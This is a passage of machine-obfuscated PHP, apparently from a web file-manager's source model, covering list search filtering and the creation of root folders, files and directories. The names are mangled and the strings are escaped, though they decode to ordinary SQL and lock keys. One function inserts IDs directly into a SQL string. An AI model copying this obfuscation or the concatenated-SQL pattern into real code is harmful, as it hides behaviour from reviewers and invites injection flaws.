array_to_keyvalue($ÎÛº·Ôí, $æĞÊ¤[22], $æĞÊ¤[97]); $éÚ–‡âŒ = array_unique($ÎÛº·Ôí); $this->_listSearchMerge($ÌÎÁôä, $õ­üí¬ˆ, $²ò§¹€Ù, $éÚ–‡âŒ); } private function _listSearchDesc(&$¦ÆÂ‘·, $É×©»ô, $£¦³¶ÉÅ) { $ ¼ë¯• =& $_SERVER[Õò”†—·]; if (!$É×©»ô[$ ¼ë¯•[2052]] || $¦ÆÂ‘·[$ ¼ë¯•[426]][$ ¼ë¯•[413]] > 1) { return; } $¸÷À–¿Ú = array($ ¼ë¯•[107] => $ ¼ë¯•[510], $ ¼ë¯•[434] => array($ ¼ë¯•[443], $ ¼ë¯•[2054] . $É×©»ô[$ ¼ë¯•[2052]] . $ ¼ë¯•[2054])); $µŠÉ²”ó = !1; if ($µŠÉ²”ó) { $şğ–êú = $this->listSearchChildren($É×©»ô[$ ¼ë¯•[193]]); $şğ–êú = array_unique($şğ–êú); if (!$şğ–êú) { return; } $¸÷À–¿Ú[$ ¼ë¯•[194]] = array($ ¼ë¯•[17], $şğ–êú); } $´³ó¥·é = Model($ ¼ë¯•[616])->field($ ¼ë¯•[194])->where($¸÷À–¿Ú)->limit(5000)->select(); $ï¡Òö¯¾ = array_to_keyvalue($´³ó¥·é, $ ¼ë¯•[22], $ ¼ë¯•[194]); $this->_listSearchMerge($¦ÆÂ‘·, $É×©»ô, $£¦³¶ÉÅ, $ï¡Òö¯¾); } private function _listSearchGroupTag(&$ğÉÁ«Ï”, $çá·‹Ã½, $È‡ÍóÍ¼) { $Î‡öú¢… =& $_SERVER[Õò”†—·]; if (!$çá·‹Ã½[$Î‡öú¢…[2052]] || $ğÉÁ«Ï”[$Î‡öú¢…[426]][$Î‡öú¢…[413]] > 1 || !$çá·‹Ã½[$Î‡öú¢…[193]]) { return; } $ºÉ¡¤˜‚ = $this->sourceInfo($çá·‹Ã½[$Î‡öú¢…[193]]); if (!$ºÉ¡¤˜‚ || $ºÉ¡¤˜‚[$Î‡öú¢…[191]] != SourceModel::TYPE_GROUP) { return; } $À„Ñ’³‘ = $ºÉ¡¤˜‚[$Î‡öú¢…[554]]; $áÛ¾¯”Ú = Model($Î‡öú¢…[2221])->get($À„Ñ’³‘); $Ç—¡±Ş = array(); $‰°ÎÌ½¼ = $çá·‹Ã½[$Î‡öú¢…[2052]]; foreach ($áÛ¾¯”Ú[$Î‡öú¢…[429]] as $»óĞ†éö) { $Î—Òß¶Ø = $»óĞ†éö[$Î‡öú¢…[42]]; $Ä÷™äì  = str_replace($Î‡öú¢…[63], $Î‡öú¢…[22], Pinyin::get($Î—Òß¶Ø)); if (stripos($Î—Òß¶Ø, $‰°ÎÌ½¼) !== !1 || stripos($Ä÷™äì , $‰°ÎÌ½¼) !== !1) { $Ç—¡±Ş[] = $»óĞ†éö[$Î‡öú¢…[459]]; } } if (!$Ç—¡±Ş) { return; } $íÎÕÒùÆ = array($Î‡öú¢…[484] => array($Î‡öú¢…[17], $Ç—¡±Ş), $Î‡öú¢…[1755] => 0, $Î‡öú¢…[43] => $Î‡öú¢…[2074] . $À„Ñ’³‘); $¶î¶€ı = Model($Î‡öú¢…[486])->field($Î‡öú¢…[97])->where($íÎÕÒùÆ)->select(); $¶î¶€ı = array_to_keyvalue($¶î¶€ı, $Î‡öú¢…[22], $Î‡öú¢…[97]); $ßôİÂ¢È = array_unique($¶î¶€ı); $this->_listSearchMerge($ğÉÁ«Ï”, $çá·‹Ã½, $È‡ÍóÍ¼, $ßôİÂ¢È); } private function _listSearchMerge(&$ØøÍ¥ÏÈ, $¡³ƒ­Â, $¦ï¿Ñ‡, $¼®‘É€è) { $ğÑ—µˆù =& $_SERVER[Õò”†—·]; if (!$¼®‘É€è) { return; } $üßÎı™’ = array_to_keyvalue($ØøÍ¥ÏÈ[$ğÑ—µˆù[429]], $ğÑ—µˆù[22], $ğÑ—µˆù[194]); $£½©¯üÉ = array_diff($¼®‘É€è, $üßÎı™’); if (!$£½©¯üÉ) { return; } $ÕÅÁŒæÍ = array($ğÑ—µˆù[194] => array($ğÑ—µˆù[17], $£½©¯üÉ)); $È‚Â’Ä = $this->field($¦ï¿Ñ‡)->where($ÕÅÁŒæÍ)->select(); if (!$È‚Â’Ä) { return; } $ì²„Ç“ª = array(); foreach ($È‚Â’Ä as $ŞùµûÀü) { if ($this->_listSearchFilter($ŞùµûÀü, $¡³ƒ­Â)) { $ì²„Ç“ª[] = $ŞùµûÀü; } } $ØøÍ¥ÏÈ[$ğÑ—µˆù[429]] = array_merge($ì²„Ç“ª, $ØøÍ¥ÏÈ[$ğÑ—µˆù[429]]); $ØøÍ¥ÏÈ[$ğÑ—µˆù[426]][$ğÑ—µˆù[427]] += count($ì²„Ç“ª); } private function _listSearchFilter($ı®Á¬ó, $¤»À÷¥) { $òŠÒñï =& $_SERVER[Õò”†—·]; $Ò¾øƒŠß = $ı®Á¬ó[$òŠÒñï[469]] == $òŠÒñï[101]; if (!strstr($ı®Á¬ó[$òŠÒñï[569]], $òŠÒñï[60] . $¤»À÷¥[$òŠÒñï[193]] . $òŠÒñï[60])) { return !1; } if (isset($¤»À÷¥[$òŠÒñï[470]]) && $¤»À÷¥[$òŠÒñï[470]] != $òŠÒñï[2009]) { if ($¤»À÷¥[$òŠÒñï[470]] == $òŠÒñï[88] && !$Ò¾øƒŠß) { return !1; } if ($¤»À÷¥[$òŠÒñï[470]] != $òŠÒñï[88] && $Ò¾øƒŠß) { return !1; } if (!strstr($ı®Á¬ó[$òŠÒñï[188]], $òŠÒñï[60] . $¤»À÷¥[$òŠÒñï[470]] . $òŠÒñï[60])) { return !1; } } if (isset($¤»À÷¥[$òŠÒñï[2222]]) && $¤»À÷¥[$òŠÒñï[2222]] < $ı®Á¬ó[$òŠÒñï[89]]) { return !1; } if (isset($¤»À÷¥[$òŠÒñï[2223]]) && $¤»À÷¥[$òŠÒñï[2223]] > $ı®Á¬ó[$òŠÒñï[89]]) { return !1; } if (isset($¤»À÷¥[$òŠÒñï[646]]) && $¤»À÷¥[$òŠÒñï[646]] != $ı®Á¬ó[$òŠÒñï[513]]) { return !1; } return !0; } public function listSearchChildren($ÄØ²ùô°, $¥ÁÙÈÃ¶ = 5000) { $óé‘¥ºµ =& $_SERVER[Õò”†—·]; $ÃıÈ‘¸¸ = array(); $ğ®˜÷ÔŸ = $this->sourceInfo($ÄØ²ùô°); $÷™‘Ñ–´ = array($óé‘¥ºµ[569] => array($óé‘¥ºµ[443], $ğ®˜÷ÔŸ[$óé‘¥ºµ[569]] . $ğ®˜÷ÔŸ[$óé‘¥ºµ[194]] . $óé‘¥ºµ[597])); $Æê®ÙÈ = $this->field($óé‘¥ºµ[89])->where($÷™‘Ñ–´)->limit($¥ÁÙÈÃ¶ + 1)->select(); $Æ¾ÍÇúÛ = is_array($Æê®ÙÈ) ? count($Æê®ÙÈ) : 0; if ($Æ¾ÍÇúÛ > $¥ÁÙÈÃ¶) { return $this->_listSearchChildrenNear($ÄØ²ùô°, $¥ÁÙÈÃ¶); } $Ùà¸Ÿ = $this->field($óé‘¥ºµ[194])->where($÷™‘Ñ–´)->select(); $ÃıÈ‘¸¸ = array_to_keyvalue($Ùà¸Ÿ, $óé‘¥ºµ[22], $óé‘¥ºµ[194]); return $ÃıÈ‘¸¸; } private function _listSearchChildrenNear($–Âøşã, $Ò§¾õ‡×) { $°”Ñ„®‚ =& $_SERVER[Õò”†—·]; $Š¸•òƒÓ = array(); $–Ëñ¥¨ = array($°”Ñ„®‚[193] => $–Âøşã); $¢ê‚æ«½ = $this->field($°”Ñ„®‚[2224])->where($–Ëñ¥¨)->select(); $²î’Ì˜é = array_to_keyvalue(array_filter_by_field($¢ê‚æ«½, $°”Ñ„®‚[469], $°”Ñ„®‚[101]), $°”Ñ„®‚[22], $°”Ñ„®‚[194]); $Š¸•òƒÓ = array_merge($Š¸•òƒÓ, array_to_keyvalue($¢ê‚æ«½, $°”Ñ„®‚[22], $°”Ñ„®‚[194])); if (!$²î’Ì˜é) { return $Š¸•òƒÓ; } $–Ëñ¥¨ = array($°”Ñ„®‚[193] => array($°”Ñ„®‚[17], $²î’Ì˜é)); $¢ê‚æ«½ = $this->field($°”Ñ„®‚[2224])->where($–Ëñ¥¨)->limit($Ò§¾õ‡×)->select(); $Š¸•òƒÓ = array_merge($Š¸•òƒÓ, array_to_keyvalue($¢ê‚æ«½, $°”Ñ„®‚[22], $°”Ñ„®‚[194])); $Š¸•òƒÓ = array_slice($Š¸•òƒÓ, 0, intval($Ò§¾õ‡×)); return $Š¸•òƒÓ; } private function _listSearchBindPinyin($¨ª÷”Û¬, &$Ò¾ÇÎÃ¨, &$ı›››åµ) { $—Çª¥±È =& $_SERVER[Õò”†—·]; if (!isset($¨ª÷”Û¬[$—Çª¥±È[2052]]) || !$¨ª÷”Û¬[$—Çª¥±È[2052]]) { return; } if (!Input::check($¨ª÷”Û¬[$—Çª¥±È[2052]], $—Çª¥±È[378]) || strlen($¨ª÷”Û¬[$—Çª¥±È[2052]]) < 2) { return; } $ßóå¿¶ = "\114\105\106\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\157\x5f\163\x6f\x75\162\x63\x65\137\155\145\164\x61\40\155\145\x74\141\40\x6f\x6e\x20\x73\x6f\x75\x72\x63\x65\56\x73\157\x75\x72\x63\145\111\x44\40\75\x20\155\145\164\141\x2e\163\157\x75\162\143\x65\x49\x44"; $£ÂÙ—Î = array(); $ı›››åµ = str_replace(array($—Çª¥±È[12], $—Çª¥±È[63], $—Çª¥±È[2225]), $—Çª¥±È[22], $ı›››åµ); $ı›››åµ = $—Çª¥±È[495] . str_replace($—Çª¥±È[60], $—Çª¥±È[496], $ı›››åµ); $Íâë¾ñ = $Ò¾ÇÎÃ¨[$—Çª¥±È[42]]; unset($Ò¾ÇÎÃ¨[$—Çª¥±È[42]]); foreach ($Ò¾ÇÎÃ¨ as $‚â‚ü«ì => $æÍÓ­×) { $£ÂÙ—Î[$—Çª¥±È[495] . $‚â‚ü«ì] = $æÍÓ­×; } foreach ($Íâë¾ñ as $ı’†ˆ¢”) { $£ÂÙ—Î[] = array($—Çª¥±È[500] => $ı’†ˆ¢”, $—Çª¥±È[1050] => $—Çª¥±È[2056], array($—Çª¥±È[2226] => $ı’†ˆ¢”, $—Çª¥±È[2227] => array($—Çª¥±È[17], array($—Çª¥±È[522], $—Çª¥±È[521])))); } $this->join($ßóå¿¶); $Ò¾ÇÎÃ¨ = $£ÂÙ—Î; } private function _parseSearchWhere($Âëø²öö) { $¿«›öæ‚ =& $_SERVER[Õò”†—·]; $÷Š¨…ıµ = array(); if (isset($Âëø²öö[$¿«›öæ‚[811]]) && $Âëø²öö[$¿«›öæ‚[811]]) { $÷Š¨…ıµ[$¿«›öæ‚[98]] = array($¿«›öæ‚[2228], $Âëø²öö[$¿«›öæ‚[811]]); } if (isset($Âëø²öö[$¿«›öæ‚[812]]) && $Âëø²öö[$¿«›öæ‚[812]]) { $ŠºÊÀ¬Ó = array($¿«›öæ‚[2229], $Âëø²öö[$¿«›öæ‚[812]]); if ($÷Š¨…ıµ[$¿«›öæ‚[98]]) { $÷Š¨…ıµ[$¿«›öæ‚[98]] = array($÷Š¨…ıµ[$¿«›öæ‚[98]], $ŠºÊÀ¬Ó, $¿«›öæ‚[2230]); } else { $÷Š¨…ıµ[$¿«›öæ‚[98]] = $ŠºÊÀ¬Ó; } } if (isset($Âëø²öö[$¿«›öæ‚[2222]]) && $Âëø²öö[$¿«›öæ‚[2222]] > 0) { $÷Š¨…ıµ[$¿«›öæ‚[89]] = array($¿«›öæ‚[2228], $Âëø²öö[$¿«›öæ‚[2222]]); } if (isset($Âëø²öö[$¿«›öæ‚[2223]]) && $Âëø²öö[$¿«›öæ‚[2223]]) { $ŠºÊÀ¬Ó = array($¿«›öæ‚[2229], $Âëø²öö[$¿«›öæ‚[2223]]); if ($÷Š¨…ıµ[$¿«›öæ‚[89]]) { $÷Š¨…ıµ[$¿«›öæ‚[89]] = array($÷Š¨…ıµ[$¿«›öæ‚[89]], $ŠºÊÀ¬Ó, $¿«›öæ‚[2230]); } else { $÷Š¨…ıµ[$¿«›öæ‚[89]] = $ŠºÊÀ¬Ó; } } if (isset($Âëø²öö[$¿«›öæ‚[646]]) && $Âëø²öö[$¿«›öæ‚[646]]) { $÷Š¨…ıµ[] = array($¿«›öæ‚[513] => $Âëø²öö[$¿«›öæ‚[646]], $¿«›öæ‚[511] => $Âëø²öö[$¿«›öæ‚[646]], $¿«›öæ‚[1050] => $¿«›öæ‚[2056]); } if (isset($Âëø²öö[$¿«›öæ‚[470]]) && $Âëø²öö[$¿«›öæ‚[470]]) { $ºÖë¶–À = $Âëø²öö[$¿«›öæ‚[470]]; if ($ºÖë¶–À == $¿«›öæ‚[88]) { $÷Š¨…ıµ[$¿«›öæ‚[469]] = 1; } else { if ($ºÖë¶–À == $¿«›öæ‚[2231]) { $÷Š¨…ıµ[$¿«›öæ‚[469]] = 0; } else { if ($ºÖë¶–À) { $ºÖë¶–À = is_array($ºÖë¶–À) ? $ºÖë¶–À : explode($¿«›öæ‚[60], $ºÖë¶–À); $÷Š¨…ıµ[$¿«›öæ‚[470]] = array($¿«›öæ‚[476], $ºÖë¶–À); $÷Š¨…ıµ[$¿«›öæ‚[469]] = 0; } } } } $this->_parseSearchParent($Âëø²öö, $÷Š¨…ıµ); if (isset($Âëø²öö[$¿«›öæ‚[2052]]) && trim($Âëø²öö[$¿«›öæ‚[2052]])) { $ğÚµŠÑ = trim($Âëø²öö[$¿«›öæ‚[2052]]); $şİÊ½Ø = explode($¿«›öæ‚[63], $ğÚµŠÑ); if (strlen($ğÚµŠÑ) > 2 && (substr($ğÚµŠÑ, 0, 1) == $¿«›öæ‚[131] && substr($ğÚµŠÑ, -1) == $¿«›öæ‚[131]) || substr($ğÚµŠÑ, 0, 1) == $¿«›öæ‚[68] && substr($ğÚµŠÑ, -1) == $¿«›öæ‚[68]) { $ğÚµŠÑ = substr($ğÚµŠÑ, 1, -1); $şİÊ½Ø = array($ğÚµŠÑ); } $÷Š¨…ıµ[$¿«›öæ‚[42]] = array(array($¿«›öæ‚[596], $¿«›öæ‚[2054] . $ğÚµŠÑ . $¿«›öæ‚[2054])); if (count($şİÊ½Ø) > 1) { $÷Š¨…ıµ[$¿«›öæ‚[42]] = array(); foreach ($şİÊ½Ø as $‘õÃƒÊ) { if (!trim($‘õÃƒÊ)) { continue; } $÷Š¨…ıµ[$¿«›öæ‚[42]][] = array($¿«›öæ‚[596], $¿«›öæ‚[2054] . trim($‘õÃƒÊ) . $¿«›öæ‚[2054]); } } } return $÷Š¨…ıµ; } private function _parseSearchParent($şÑ‰Î, &$÷ŸıÉˆ‘) { $¨î¢Š¸¹ =& $_SERVER[Õò”†—·]; if (!isset($şÑ‰Î[$¨î¢Š¸¹[193]]) || !$şÑ‰Î[$¨î¢Š¸¹[193]]) { return; } $êòÕ²· = $this->pathInfo($şÑ‰Î[$¨î¢Š¸¹[193]]); $â§Ü¤Ò = $êòÕ²·[$¨î¢Š¸¹[193]] . $¨î¢Š¸¹[22] === $¨î¢Š¸¹[229]; $ªáîÏ† = $êòÕ²·[$¨î¢Š¸¹[191]] == $¨î¢Š¸¹[563]; if ($êòÕ²·[$¨î¢Š¸¹[580]] == $¨î¢Š¸¹[581]) { $®£‚¤ƒä = $this->sourceInfo($şÑ‰Î[$¨î¢Š¸¹[193]]); $êòÕ²·[$¨î¢Š¸¹[569]] = $®£‚¤ƒä[$¨î¢Š¸¹[569]]; } $÷ŸıÉˆ‘[$¨î¢Š¸¹[636]] = array($¨î¢Š¸¹[596], $êòÕ²·[$¨î¢Š¸¹[569]] . $şÑ‰Î[$¨î¢Š¸¹[193]] . $¨î¢Š¸¹[597]); $ÔÚöï¤ = isset($şÑ‰Î[$¨î¢Š¸¹[1912]]) && in_array($¨î¢Š¸¹[563], $şÑ‰Î[$¨î¢Š¸¹[1912]]); if (!$ÔÚöï¤ || !$ªáîÏ† || !$â§Ü¤Ò || !$êòÕ²·[$¨î¢Š¸¹[471]]) { return; } if (!AuthModel::authCheckRoot($êòÕ²·[$¨î¢Š¸¹[471]][$¨î¢Š¸¹[472]])) { return; } $¨–ğùè½ = $êòÕ²·[$¨î¢Š¸¹[554]] . $¨î¢Š¸¹[22]; if ($¨–ğùè½ == $¨î¢Š¸¹[101]) { unset($÷ŸıÉˆ‘[$¨î¢Š¸¹[636]]); $÷ŸıÉˆ‘[$¨î¢Š¸¹[191]] = self::TYPE_GROUP; return; } $¾Õ‹Çòı = Model($¨î¢Š¸¹[570])->groupChildrenAll($¨–ğùè½); $Á®î›˜ = count($¾Õ‹Çòı); if ($Á®î›˜ <= 1) { return; } $»åªª—Ø = array($¨î¢Š¸¹[193] => 0, $¨î¢Š¸¹[191] => self::TYPE_GROUP, $¨î¢Š¸¹[554] => array($¨î¢Š¸¹[17], $¾Õ‹Çòı)); $…©ºøµ’ = $this->field($¨î¢Š¸¹[2232])->where($»åªª—Ø)->limit($Á®î›˜)->select(); $÷ŸıÉˆ‘[$¨î¢Š¸¹[636]] = array(); foreach ($…©ºøµ’ as $ìµú­´) { $÷ŸıÉˆ‘[$¨î¢Š¸¹[636]][] = array($¨î¢Š¸¹[596], $¨î¢Š¸¹[579] . $ìµú­´[$¨î¢Š¸¹[194]] . $¨î¢Š¸¹[597]); } $÷ŸıÉˆ‘[$¨î¢Š¸¹[636]][] = $¨î¢Š¸¹[2056]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Âäô¨Ã¯) { $·êÙŠî˜ =& $_SERVER[Õò”†—·]; $ˆªüÁ’– = Model($·êÙŠî˜[562])->where(array($·êÙŠî˜[1746] => $Âäô¨Ã¯))->find(); $¿ÚÌ­£Å = $this->_mkdirRoot(SourceModel::TYPE_USER, $Âäô¨Ã¯, $ˆªüÁ’–[$·êÙŠî˜[42]]); $this->userDesktopAdd($¿ÚÌ­£Å); return $¿ÚÌ­£Å; } public function userDesktopAdd($Íï¬Ó³Ø) { $¸¾ÇößÊ =& $_SERVER[Õò”†—·]; $äŒÒ‰Ù™ = LNG($¸¾ÇößÊ[2233]); $íÆ‹˜ƒ­ = $this->mkdir($Íï¬Ó³Ø, $äŒÒ‰Ù™); $this->metaSet($íÆ‹˜ƒ­, $¸¾ÇößÊ[2234], $¸¾ÇößÊ[101]); $this->metaSet($Íï¬Ó³Ø, $¸¾ÇößÊ[2235], $íÆ‹˜ƒ­); } public function userPathSafeAdd($Ç¦ĞÉ‹) { $¢¾è¶ØŸ =& $_SERVER[Õò”†—·]; $œ‰‚¬àã = Model($¢¾è¶ØŸ[562])->getInfoFull($Ç¦ĞÉ‹); if (!$œ‰‚¬àã) { return !1; } if (_get($œ‰‚¬àã, $¢¾è¶ØŸ[584])) { return $œ‰‚¬àã[$¢¾è¶ØŸ[523]][$¢¾è¶ØŸ[2236]]; } $á´·’œ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ç¦ĞÉ‹, $¢¾è¶ØŸ[2237], $¢¾è¶ØŸ[490]); Model($¢¾è¶ØŸ[562])->metaSet($Ç¦ĞÉ‹, $¢¾è¶ØŸ[2236], $á´·’œ); $this->metaSet($á´·’œ, $¢¾è¶ØŸ[2238], $Ç¦ĞÉ‹); return $á´·’œ; } public function groupRootAdd($‘åîïÉ) { $‰Ç×™á× =& $_SERVER[Õò”†—·]; $›éˆÍı— = Model($‰Ç×™á×[570])->where(array($‰Ç×™á×[2046] => $‘åîïÉ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $‘åîïÉ, $›éˆÍı—[$‰Ç×™á×[42]]); } public function systemRootPathAdd($»¥Éî±¯) { if ($»¥Éî±¯ != $_SERVER[Õò”†—·][590]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $»¥Éî±¯); } public function userRootRemove($±„å…î”) { $¡Ü®‘Ñ€ = $this->targetSourceRoot(SourceModel::TYPE_USER, $±„å…î”, !0); foreach ($¡Ü®‘Ñ€ as $—ÑÇß) { if (!$—ÑÇß) { continue; } $this->remove($—ÑÇß[$_SERVER[Õò”†—·][194]], !1); } } public function groupRootRemove($âÜÕ˜Ú½) { $ğº˜Ò…ï = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $âÜÕ˜Ú½); if (!$ğº˜Ò…ï) { return; } $this->remove($ğº˜Ò…ï[$_SERVER[Õò”†—·][194]], !1); } private function _mkdirRoot($ÃÖŒ¼ÍÖ, $Ë¤Î…èç, $ïôÎ¦ÄÎ, $ô¿ÚŞèã = '') { $À‡¬©ˆª =& $_SERVER[Õò”†—·]; $‹Ñí°Ğ¥ = defined($À‡¬©ˆª[2180]) ? USER_ID : 0; $µ¸àçèŒ = array($À‡¬©ˆª[461] => 0, $À‡¬©ˆª[632] => $ÃÖŒ¼ÍÖ, $À‡¬©ˆª[633] => $Ë¤Î…èç, $À‡¬©ˆª[630] => 1, $À‡¬©ˆª[634] => $‹Ñí°Ğ¥, $À‡¬©ˆª[635] => $‹Ñí°Ğ¥, $À‡¬©ˆª[631] => $ô¿ÚŞèã, $À‡¬©ˆª[636] => $À‡¬©ˆª[579], $À‡¬©ˆª[488] => 0, $À‡¬©ˆª[601] => 0, $À‡¬©ˆª[526] => 0, $À‡¬©ˆª[637] => $À‡¬©ˆª[22]); if ($å‚­ø£ = $this->where($µ¸àçèŒ)->find()) { return $å‚­ø£[$À‡¬©ˆª[194]]; } $ĞÛ“Òî = "\x4d\x6f\144\x65\154\123\157\165\162\143\145\56\x6d\x6b\x64\151\162\122\x6f\x6f\x74\56{$ÃÖŒ¼ÍÖ}\56{$Ë¤Î…èç}\56" . $ïôÎ¦ÄÎ; CacheLock::lock($ĞÛ“Òî); $µ¸àçèŒ[$À‡¬©ˆª[42]] = $ïôÎ¦ÄÎ; $¿–âÁé = $this->add($µ¸àçèŒ); $ƒÎı¬±† = array($À‡¬©ˆª[638] => short_id($¿–âÁé)); $this->where(array($À‡¬©ˆª[475] => $¿–âÁé))->save($ƒÎı¬±†); CacheLock::unlock($ĞÛ“Òî); return $¿–âÁé; } private function targetSourceRoot($í¿ü³“ª, $Ó‡›¯šÀ, $İ¦¼™•¨ = false) { $ÏµÊú÷¼ =& $_SERVER[Õò”†—·]; $ú²ÑÌ•² = array($ÏµÊú÷¼[461] => 0, $ÏµÊú÷¼[632] => $í¿ü³“ª, $ÏµÊú÷¼[633] => $Ó‡›¯šÀ); if ($İ¦¼™•¨) { $­ğÓœ» = $this->where($ú²ÑÌ•²)->select(); return $­ğÓœ» ? $­ğÓœ» : array(); } $ì¶˜Èö² = $this->where($ú²ÑÌ•²)->find(); return $ì¶˜Èö² ? $ì¶˜Èö² : array(); } public function sourceRootGroup($»Ç·ú—) { $ÛŸ¬êõ‰ =& $_SERVER[Õò”†—·]; if (is_string($»Ç·ú—)) { $»Ç·ú— = array($»Ç·ú—); } $œÙ˜ˆä„ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $»Ç·ú—, $ÛŸ¬êõ‰[221]); $ü±îÕ¿ = array($ÛŸ¬êõ‰[429] => $œÙ˜ˆä„, $ÛŸ¬êõ‰[426] => array($ÛŸ¬êõ‰[809] => count($»Ç·ú—))); $this->_listDataApply($ü±îÕ¿[$ÛŸ¬êõ‰[429]]); $this->_listMake($ü±îÕ¿); return array_to_keyvalue($ü±îÕ¿[$ÛŸ¬êõ‰[95]], $ÛŸ¬êõ‰[554]); } public function mkfile($õ›êæˆú, $‘Î•à½Ğ, $°ş¸ÛÅş = '', $Üã ²ŒÀ = REPEAT_RENAME) { $ñÛŒ†ªË =& $_SERVER[Õò”†—·]; $Ç¥ÛŸ” = Model($ñÛŒ†ªË[658])->addFileByContent($°ş¸ÛÅş, $‘Î•à½Ğ); return $this->_createFileCall($õ›êæˆú, $‘Î•à½Ğ, $Ç¥ÛŸ”, $Üã ²ŒÀ, $ñÛŒ†ªË[1398]); } public function addFile($Î¹©Ë˜è, $“•Ó‰‰„, $òóËÊÇ, $÷‡ë©ÄÌ = false, $‡×òçÀ½ = REPEAT_RENAME) { $Úã®™” = Model($_SERVER[Õò”†—·][658])->addFile($“•Ó‰‰„, $òóËÊÇ, $÷‡ë©ÄÌ); return $this->_createFileCall($Î¹©Ë˜è, $òóËÊÇ, $Úã®™”, $‡×òçÀ½); } public function addFileByFileID($î‚„ÏÖ, $ŠúêÎ±¼, $Ã¯¯°×Î, $›éØñ©¸ = REPEAT_RENAME) { $Æéî¬¯Ì =& $_SERVER[Õò”†—·]; $…·«À¬ë = Model($Æéî¬¯Ì[658])->find($ŠúêÎ±¼); Model($Æéî¬¯Ì[658])->linkAdd($ŠúêÎ±¼); return $this->_createFileCall($î‚„ÏÖ, $Ã¯¯°×Î, $…·«À¬ë, $›éØñ©¸); } public function addFileByRemote($Ù¦ÏúÀÔ, $ˆŒŒ”¹, $±æïöÔË, $÷ÇÄ‡ç’ = array(), $·Ù™€Ñ = REPEAT_RENAME) { $Òé™ïÑè = Model($_SERVER[Õò”†—·][658])->addFileByRemote($ˆŒŒ”¹, $±æïöÔË, $÷ÇÄ‡ç’); return $this->_createFileCall($Ù¦ÏúÀÔ, $±æïöÔË, $Òé™ïÑè, $·Ù™€Ñ); } private function _createFileCall($í’µÜİ®, $ÊˆµÓÜê, $ğ©‚šÊè, $ƒ–Ö˜±ê, $ü½¼È³Ÿ = "\165\160\154\x6f\x61\x64") { $‹Ù©ÑŸ =& $_SERVER[Õò”†—·]; $Èƒˆœï = !1; $this->setMasterDB(); $this->lockWriteStart($í’µÜİ®, $ÊˆµÓÜê); $Õİ³» = $this->fileNameExist($í’µÜİ®, $ÊˆµÓÜê); $º¥± ”ˆ = $this->_createFile($í’µÜİ®, $ÊˆµÓÜê, $ğ©‚šÊè, $ƒ–Ö˜±ê, $Èƒˆœï); if (!$Èƒˆœï) { Model($‹Ù©ÑŸ[528])->remove($ğ©‚šÊè[$‹Ù©ÑŸ[525]]); } if ($Èƒˆœï && $º¥± ”ˆ && $º¥± ”ˆ != $Õİ³») { Model($‹Ù©ÑŸ[2206])->eventCreate($º¥± ”ˆ, $ü½¼È³Ÿ); } $this->lockWriteEnd($í’µÜİ®, $ÊˆµÓÜê); return $º¥± ”ˆ; } public function mkdir($¶óÓÌ©ù, $ò‰×î‡í, $ûô—ôì = REPEAT_SKIP) { $ó”Ø„”¾ =& $_SERVER[Õò”†—·]; $this->setMasterDB(); $ñ’İ¨‡± = $this->sourceInfo($¶óÓÌ©ù); if (!$ñ’İ¨‡±) { return !1; } $this->lockWriteStart($¶óÓÌ©ù, $ò‰×î‡í); if ($ûô—ôì !== !1) { $ŒÄÓ‹³« = $this->fileNameExist($¶óÓÌ©ù, $ò‰×î‡í); if ($ŒÄÓ‹³« && $ûô—ôì != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¶óÓÌ©ù, $ò‰×î‡í); return $ŒÄÓ‹³«; } $ò‰×î‡í = $this->fileNameAuto($¶óÓÌ©ù, $ò‰×î‡í, $ûô—ôì); } $æ¼Óì”¶ = array($ó”Ø„”¾[630] => 1, $ó”Ø„”¾[478] => $ò‰×î‡í, $ó”Ø„”¾[631] => $ó”Ø„”¾[22], $ó”Ø„”¾[526] => 0, $ó”Ø„”¾[601] => 0); $ğÔš›İ = $this->_addSource($æ¼Óì”¶, $ñ’İ¨‡±); Model($ó”Ø„”¾[2206])->eventCreate($ğÔš›İ, $ó”Ø„”¾[1399]); $this->lockWriteEnd($¶óÓÌ©ù, $ò‰×î‡í); return $ğÔš›İ; } public function listSourceRoot($ÏØ„šş, $ºÓÍ’‰û, $öÕ–Ùâş = "\163\157\165\x72\x63\145\111\x44\54\x74\x61\x72\x67\x65\x74\111\x44\x2c\163\x69\172\145") { $àİ‡ô× =& $_SERVER[Õò”†—·]; $şŒØ²¶ = $àİ‡ô×[438]; $úıœíË£ = array(); $‚š®÷öÂ = 1024 * 50; $à—şĞí = is_array($à—şĞí) ? $à—şĞí : array(); $°‰‚¬½ˆ = count($ºÓÍ’‰û); $ÜÕö´Æ = $this->tablePrefix . $àİ‡ô×[2239]; for ($ëá¹Ã¬Å = 0; $ëá¹Ã¬Å < $°‰‚¬½ˆ; $ëá¹Ã¬Å++) { $ôÅ¼ˆ = $ºÓÍ’‰û[$ëá¹Ã¬Å]; $şŒØ²¶ .= "\x53\105\x4c\x45\103\124\x20\x2a\x20\106\x52\117\115\40\50\x53\105\x4c\105\x43\124\x20{$öÕ–Ùâş}\x20\x46\122\x4f\115\40\x60{$ÜÕö´Æ}\x60\x20\x57\x48\x45\x52\105\x20"; $şŒØ²¶ .= "\140\160\141\x72\x65\156\x74\111\104\x60\x3d\x30\40\101\116\104\40\x60\x74\x61\x72\147\x65\164\x49\104\140\75{$ôÅ¼ˆ}\x20\x41\x4e\104\40\x60\164\x61\162\147\x65\x74\124\x79\160\145\140\x3d{$ÏØ„šş}\x20\x61\x6e\144\x20\146\x69\154\x65\x54\171\160\145\x3d\x27\47\40\x6c\151\155\x69\164\40\61\x29\40\x61\163\40\164\142\137{$ëá¹Ã¬Å}\x20\125\x4e\x49\x4f\116\40\x41\x4c\114\40"; if ((strlen($şŒØ²¶) >= $‚š®÷öÂ || $ëá¹Ã¬Å == $°‰‚¬½ˆ - 1) && $şŒØ²¶) { $şŒØ²¶ = substr($şŒØ²¶, 0, -strlen($àİ‡ô×[1088])); $ÈÏæÛ·é = $this->query($şŒØ²¶); $şŒØ²¶ = $àİ‡ô×[22]; $úıœíË£ = array_merge($úıœíË£, $ÈÏæÛ·é); } } return $úıœíË£; } private function _createFile($£ãÃÍÃ›, $×ö—ğ¢Š, 